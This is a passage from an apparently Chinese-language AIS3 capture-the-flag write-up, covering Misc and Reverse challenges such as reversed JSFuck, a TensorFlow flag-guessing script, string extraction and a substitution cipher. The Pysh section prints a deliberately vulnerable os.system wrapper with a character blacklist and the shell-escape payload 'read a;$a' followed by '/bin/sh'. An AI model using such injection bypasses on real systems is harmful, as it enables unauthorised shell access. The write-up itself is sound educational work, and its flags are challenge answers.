][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][(+]][+[)][+]][[][(+]][!!+[)][+][!!(+]][+[)][+][!!(+]][!!+][!!+][!![)][+][!(+]][!!+[)][+]][[][(+]]][+[+][!!+[)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][!!(+]][!!+][!!+][!![)]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][+][([]]][!!+][!![)][+][!(+]][!!+][!![)][+][!(+]]][+[+][!!+[)]][[][+]][![(+]][+[)][+][!([][</span><br></pre></td></tr></table></figure>

<p>看了兩下覺得很像jsfuck，然後再看看題目就發現是jsfuck被rev過了，所以就再rev一下拿去瀏覽器跑</p>
<p>就拿到flag: <code>AIS3&#123;R33v33rs33_JSFUCKKKKKK&#125;</code></p>
<h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>照著執行上面寫的hash就可以拿到flag: <code>AIS3&#123;988069d2c08c1910f422737ca412afe2&#125;</code></p>
<h3 id="Pysh"><a href="#Pysh" class="headerlink" title="Pysh"></a>Pysh</h3><p>首先拿到一個python腳本，一樣看起來是要利用有限的字元集構造出一個任意執行的shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">black_list = <span class="string">&quot;bcfghijkmnoqstuvwxz!@#|[]&#123;&#125;\&quot;&#x27;&amp;*()?01234569&quot;</span></span><br><span class="line"></span><br><span class="line">your_input = raw_input(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(black_list)):</span><br><span class="line">    <span class="keyword">if</span> black_list[i] <span class="keyword">in</span> your_input:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Bad hacker....&quot;</span></span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> os.system(<span class="string">&quot;bash -c &#x27;&quot;</span> + your_input + <span class="string">&quot;&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>幾下後就想到有個read的指令，之前我就是用他來過某題pwnable.kr的題目的</p>
<p>具體payload就是<code>read a;$a</code>之後再打個<code>/bin/sh</code>就有完整shell了</p>
<p>去裡面翻一翻可以翻到flag: <code>AIS3&#123;read;$REPLY&#125;</code></p>
<h3 id="Mind-Reading"><a href="#Mind-Reading" class="headerlink" title="Mind Reading"></a>Mind Reading</h3><p>發現是個tensorflow的東東，不過我沒學過ML，只好開始爬文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pylint: disable=import-error</span></span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.models <span class="keyword">import</span> Sequential, load_model</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.layers <span class="keyword">import</span> Embedding, Dense, Flatten</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Encode string into indeces according to chars.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> np.array([chars.index(c) <span class="keyword">for</span> c <span class="keyword">in</span> string])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">indeces</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Decode indeces of chars into string.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(chars.__getitem__, indeces))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_model</span>(<span class="params">flag_size, dim</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Build a model to classify flag and non-flags.&#x27;&#x27;&#x27;</span></span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Embedding(dim, <span class="number">32</span>, input_length=flag_size))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(<span class="number">512</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(<span class="number">256</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(<span class="number">1</span>, activation=<span class="string">&#x27;sigmoid&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    model.<span class="built_in">compile</span>(</span><br><span class="line">        loss=<span class="string">&#x27;binary_crossentropy&#x27;</span>,</span><br><span class="line">        optimizer=<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">        metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_noise</span>(<span class="params">size, dim</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Generate random indeces within range(dim).&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> np.random.randint(dim, size=size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dataset</span>(<span class="params">dataset_size, flag, dim</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Construct dataset for training.&#x27;&#x27;&#x27;</span></span><br><span class="line">    m_true = dataset_size // <span class="number">2</span></span><br><span class="line">    m_false = dataset_size - m_true</span><br><span class="line"></span><br><span class="line">    x_true = np.tile(flag, (m_true, <span class="number">1</span>))</span><br><span class="line">    y_true = np.ones((m_true, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    x_false = np.stack(generate_noise(flag.size, dim) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m_false))</span><br><span class="line">    y_false = np.zeros((m_false, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    idxs = <span class="built_in">list</span>(<span class="built_in">range</span>(dataset_size))</span><br><span class="line">    random.shuffle(idxs)</span><br><span class="line"></span><br><span class="line">    xs = np.concatenate((x_true, x_false), axis=<span class="number">0</span>)[idxs]</span><br><span class="line">    ys = np.concatenate((y_true, y_false), axis=<span class="number">0</span>)[idxs]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> xs, ys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag = encode(f.read().strip())</span><br><span class="line"></span><br><span class="line">    model = build_model(flag.size, <span class="built_in">len</span>(chars))</span><br><span class="line">    model.summary()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        model.fit(</span><br><span class="line">            *dataset(<span class="number">4096</span>, flag, <span class="built_in">len</span>(chars)),</span><br><span class="line">            batch_size=<span class="number">32</span>, epochs=<span class="number">1</span>, verbose=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    model.save(<span class="string">&#x27;model.h5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">flag_score</span>(<span class="params">x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> model.predict(x.reshape(<span class="number">1</span>, -<span class="number">1</span>))[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    print(decode(flag), flag_score(flag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        noise = generate_noise(flag.size, <span class="built_in">len</span>(chars))</span><br><span class="line">        print(decode(noise), flag_score(noise))</span><br></pre></td></tr></table></figure>

<p>總之最後看懂了之後就寫了一個算法一位一位枚舉要是哪個字元，每次把最高的那個當作對的</p>
<p>雖然這樣不一定是最佳解，不過我猜應該也足夠讓我猜出答案了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pylint: disable=import-error</span></span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.models <span class="keyword">import</span> Sequential, load_model</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.layers <span class="keyword">import</span> Embedding, Dense, Flatten</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Encode string into indeces according to chars.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> np.array([chars.index(c) <span class="keyword">for</span> c <span class="keyword">in</span> string])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">indeces</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Decode indeces of chars into string.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(chars.__getitem__, indeces))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_model</span>(<span class="params">flag_size, dim</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Build a model to classify flag and non-flags.&#x27;&#x27;&#x27;</span></span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Embedding(dim, <span class="number">32</span>, input_length=flag_size))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(<span class="number">512</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(<span class="number">256</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(<span class="number">1</span>, activation=<span class="string">&#x27;sigmoid&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    model.<span class="built_in">compile</span>(</span><br><span class="line">        loss=<span class="string">&#x27;binary_crossentropy&#x27;</span>,</span><br><span class="line">        optimizer=<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">        metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_noise</span>(<span class="params">size, dim</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Generate random indeces within range(dim).&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> np.random.randint(dim, size=size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dataset</span>(<span class="params">dataset_size, flag, dim</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Construct dataset for training.&#x27;&#x27;&#x27;</span></span><br><span class="line">    m_true = dataset_size // <span class="number">2</span></span><br><span class="line">    m_false = dataset_size - m_true</span><br><span class="line"></span><br><span class="line">    x_true = np.tile(flag, (m_true, <span class="number">1</span>))</span><br><span class="line">    y_true = np.ones((m_true, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    x_false = np.stack(generate_noise(flag.size, dim) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m_false))</span><br><span class="line">    y_false = np.zeros((m_false, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    idxs = <span class="built_in">list</span>(<span class="built_in">range</span>(dataset_size))</span><br><span class="line">    random.shuffle(idxs)</span><br><span class="line"></span><br><span class="line">    xs = np.concatenate((x_true, x_false), axis=<span class="number">0</span>)[idxs]</span><br><span class="line">    ys = np.concatenate((y_true, y_false), axis=<span class="number">0</span>)[idxs]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> xs, ys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    model = load_model( <span class="string">&#x27;model.h5&#x27;</span> )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">flag_score</span>(<span class="params">x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> model.predict(x.reshape(<span class="number">1</span>, -<span class="number">1</span>))[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    flag_size = <span class="number">31</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_size):</span><br><span class="line">        best_str, best_scr = flag, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            cur_flag = flag+c+<span class="string">&quot;_&quot;</span>*(flag_size-i-<span class="number">1</span>)</span><br><span class="line">            scr = flag_score(encode(cur_flag))</span><br><span class="line">            <span class="keyword">if</span> scr &gt; best_scr:</span><br><span class="line">                best_str, best_scr = flag+c, scr</span><br><span class="line">        flag = best_str</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p>實際跑起來拿到<code>AIS3&#123;YOU_REALLY_DIDLA_GOOD_JOA&#125;</code>猜測真實FLAG應該是<code>AIS3&#123;YOU_REALLY_DID_A_GOOD_JOB&#125;</code></p>
<h3 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h3><p>拿到一堆圖片不知道要幹嘛</p>
<p>然後題目有個小hint是用希伯來文寫的諾亞方舟</p>
<p>看解答才知道原來是要寫個flood fill…</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Trivial"><a href="#Trivial" class="headerlink" title="Trivial"></a>Trivial</h3><p>拿到一個執行檔，先strings一下拿到一個看起來很像flag的東東</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">AIS3</span><br><span class="line">IS3&#123;</span><br><span class="line">S3&#123;T</span><br><span class="line">3&#123;Th</span><br><span class="line">&#123;Thi</span><br><span class="line">This</span><br><span class="line">his_</span><br><span class="line">is_i</span><br><span class="line">s_is</span><br><span class="line">_is_</span><br><span class="line">is_a</span><br><span class="line">s_a_</span><br><span class="line">_a_r</span><br><span class="line">a_re</span><br><span class="line">_rea</span><br><span class="line">real</span><br><span class="line">eall</span><br><span class="line">alll</span><br><span class="line">llll</span><br><span class="line">llll</span><br><span class="line">llll</span><br><span class="line">llll</span><br><span class="line">llll</span><br><span class="line">llll</span><br><span class="line">llll</span><br><span class="line">llll</span><br><span class="line">llly</span><br><span class="line">lly_</span><br><span class="line">ly_b</span><br><span class="line">y_bo</span><br><span class="line">_boa</span><br><span class="line">boar</span><br><span class="line">oari</span><br><span class="line">arii</span><br><span class="line">riii</span><br><span class="line">iiin</span><br><span class="line">iing</span><br><span class="line">ing_</span><br><span class="line">ng_c</span><br><span class="line">g_ch</span><br><span class="line">_cha</span><br><span class="line">chal</span><br><span class="line">hall</span><br><span class="line">alle</span><br><span class="line">llen</span><br><span class="line">leng</span><br><span class="line">enge</span><br><span class="line">nge&#125;H</span><br><span class="line">AWAVI</span><br><span class="line">AUATL</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">%60s</span><br><span class="line">Fail</span><br><span class="line">Nice</span><br><span class="line">;*3$&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把那坨東西蒐集一下就變成flag: <code>AIS3&#123;This_is_a_reallllllllllly_boariiing_challenge&#125;</code></p>
<h3 id="TsaiBro"><a href="#TsaiBro" class="headerlink" title="TsaiBro"></a>TsaiBro</h3><p>拿到一個執行檔跟一個莫名其妙的檔案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...</span><br><span class="line">發財....發財...發財.....發財...發財......發財.....發財.......發財.......發財........發財......發財....發財.發財.......發財....發財...發財.....發財........發財........發財.......發財........發財...發財..發財.發財.....發財........發財........發財.發財.發財........發財........發財.發財..發財.......發財.....發財.發財.......發財........發財........發財.發財......發財.......發財........發財..發財......發財........發財........發財.......發財....發財.發財......發財........發財........發財...發財....發財...發財...發財.發財.發財..發財.發財.發財..發財...發財..發財..發財.......發財........發財........發財..發財......發財.......發財....發財...發財.......發財........發財.......</span><br></pre></td></tr></table></figure>

<p>把執行檔拿去IDA F5後看到原來這是某個加密的程式</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> **v4; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;./TsaiBro string&quot;</span>, a2, a3, a2);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(hello_string);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(v4[<span class="number">1</span>]); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">63</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( encrypt_table[j] == v4[<span class="number">1</span>][i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(&amp;byte_968, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(j / <span class="number">8</span> + <span class="number">1</span>), <span class="string">&quot;..........&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(j % <span class="number">8</span> + <span class="number">1</span>), <span class="string">&quot;...........&quot;</span>, v4);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>顯然的那些點的數量就代表是哪個字串，所以把encrypt_table拿出來</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7A,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x7B,0x7D,0x5F</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然後透過點的數量對照回去就拿到flag: <code>AIS3&#123;y0u_4re_a_b1g_f4n_0f_tsaibro_n0w&#125;</code></p>
<h3 id="HolyGrenade"><a href="#HolyGrenade" class="headerlink" title="HolyGrenade"></a>HolyGrenade</h3><p>拿到一個pyc檔拿去decompile回來大概回拿到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python bytecode 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Embedded file name: HolyGrenade.py</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 829 bytes</span></span><br><span class="line"><span class="comment"># Decompiled by https://python-decompiler.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hash</span>(<span class="params">arg</span>):</span></span><br><span class="line">    arg = <span class="built_in">bytearray</span>(arg, <span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(arg), <span class="number">4</span>):</span><br><span class="line">        a = arg[i]</span><br><span class="line">        b = arg[i + <span class="number">1</span>]</span><br><span class="line">        c = arg[i + <span class="number">2</span>]</span><br><span class="line">        d = arg[i + <span class="number">3</span>]</span><br><span class="line">        arg[i + <span class="number">2</span>] = d</span><br><span class="line">        arg[i + <span class="number">1</span>] = a</span><br><span class="line">        arg[i + <span class="number">3</span>] = b</span><br><span class="line">        arg[i] = c</span><br><span 